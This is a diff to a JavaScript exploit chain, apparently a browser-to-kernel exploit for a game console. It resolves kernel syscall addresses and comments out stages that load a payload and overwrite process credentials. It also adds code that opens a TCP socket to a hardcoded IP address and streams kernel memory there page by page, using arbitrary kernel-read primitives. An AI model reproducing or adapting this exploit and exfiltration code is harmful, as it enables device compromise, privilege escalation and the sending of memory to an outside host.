@@ -718,17 +718,19 @@ function stage2() {
   var countbytes;
   //alert("before syscalls");
 
-  window.syscalls[20] = window.libKernelBase.add32(0x31c30);
-  window.syscalls[23] = window.libKernelBase.add32(0x2fd50);
-  window.syscalls[54] = window.libKernelBase.add32(0x30110);
-  window.syscalls[74] = window.libKernelBase.add32(0x30660);
-  window.syscalls[97] = window.libKernelBase.add32(0x32100);
-  window.syscalls[105] = window.libKernelBase.add32(0x2fff0);
-  window.syscalls[118] = window.libKernelBase.add32(0x30250);
-  window.syscalls[324] = window.libKernelBase.add32(0x32350);
-  window.syscalls[477] = window.libKernelBase.add32(0x2ffd0);
-  window.syscalls[533] = window.libKernelBase.add32(0x32310);
-  window.syscalls[534] = window.libKernelBase.add32(0x322f0);
+  window.syscalls[4] = window.libKernelBase.add32(0x30c90);//write
+  window.syscalls[20] = window.libKernelBase.add32(0x31c30);//getpid
+  window.syscalls[23] = window.libKernelBase.add32(0x2fd50);//setuid
+  window.syscalls[54] = window.libKernelBase.add32(0x30110);//ioctl
+  window.syscalls[74] = window.libKernelBase.add32(0x30660);//mprotect
+  window.syscalls[97] = window.libKernelBase.add32(0x32100);//socket
+  window.syscalls[98] = window.libKernelBase.add32(0x303b0);//connect
+  window.syscalls[105] = window.libKernelBase.add32(0x2fff0);//setsockopt
+  window.syscalls[118] = window.libKernelBase.add32(0x30250);//getsockopt
+  window.syscalls[324] = window.libKernelBase.add32(0x32350);//mlockall
+  window.syscalls[477] = window.libKernelBase.add32(0x2ffd0);//mmap
+  window.syscalls[533] = window.libKernelBase.add32(0x32310);//jitshm_create
+  window.syscalls[534] = window.libKernelBase.add32(0x322f0);//jitshm_alias
   //alert("after syscalls");
 
   p.write8(kstr, orig_kview_buf);
@@ -743,7 +745,7 @@ function stage2() {
     }
   } 
     alert("after stage 3");
-	
+	/*
     var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
     var payload_loader = p.malloc32(0x1000);
 
@@ -820,7 +822,7 @@ function stage2() {
     });
     loader_thr();
     alert("waiting for payload");
-  
+  */
 }
 
 function stage3() {
@@ -1242,9 +1244,67 @@ function stage3() {
   
   alert("here we go!");
   
+  // dump code (slow) - specter
+  function htons(port) {
+    return ((port & 0xFF) << 8) | (port >>> 8);
+  }
 
+  function aton(ip) {
+      let chunks = ip.split('.');
+      let addr = 0;
+      for(let i = 0; i < 4; i++) {
+          addr |= (parseInt(chunks[i]) << (i * 8));
+      }
+      return addr >>> 0;
+  }
+
+  function build_addr(buf, family, port, addr) {
+    p.write1(buf.add32(0x00), 0x10);
+    p.write1(buf.add32(0x01), family);
+    p.write2(buf.add32(0x02), port);
+    p.write4(buf.add32(0x04), addr);
+  }
+
+  const DUMP_NET_IP   = "89.181.169.194"; // edit this
+  let DUMP_NET_ADDR = aton(DUMP_NET_IP); 
+  let DUMP_NET_PORT = htons(5656);
+
+  let dump_sock_addr_store    = p.malloc(0x10);
+  let dump_sock_send_sz_store = p.malloc(0x4);
+  let dump_sock_connected     = 0;
+
+  let dump_sock_fd = chain.syscall(0x061, AF_INET, SOCK_STREAM, 0);
+  alert("opened dump sock=0x" + dump_sock_fd);
+
+  for (let i = 0; i < 0x10; i += 0x8) {
+    p.write8(dump_sock_addr_store.add32(i), 0);
+  }
+
+  build_addr(dump_sock_addr_store, AF_INET, DUMP_NET_PORT, DUMP_NET_ADDR);
+
+  let dump_addr = kernel_base;
+  let dump_page = p.malloc(0x1000);
+
+  alert("about to dump kernel (0x" + dump_addr + "), ensure dump server is running (" + DUMP_NET_IP + ":5656)...");
+
+  let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);
+  alert("connected dump sock? 0x" + connect_res);
+
+  for (let pfn = 0; ; pfn++) {
+    for (let off = 0; off < 0x1000; off += 0x8) {
+      let qword = kernel_read8(kernel_base.add32((pfn * 0x1000) + off));
+      p.write8(dump_page.add32(off), qword);
+    }
+
+    
+    let write_res = chain.syscall(0x004, dump_sock_fd, dump_page, 0x1000);
+    if (pfn == 0)
+      alert("first page written? 0x" + write_res);
+  }
+
+  // end dump code
   
-
+/*
   kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));
 
   //find_execution_socket();
@@ -1375,7 +1435,7 @@ function stage3() {
   chain.syscall(54, target_socket, 0x20001111, 0);
   alert("executed in kernel");
   //p.write8(0, 0);
-  
+  */
 }
 
 const stack_sz = 0x40000;
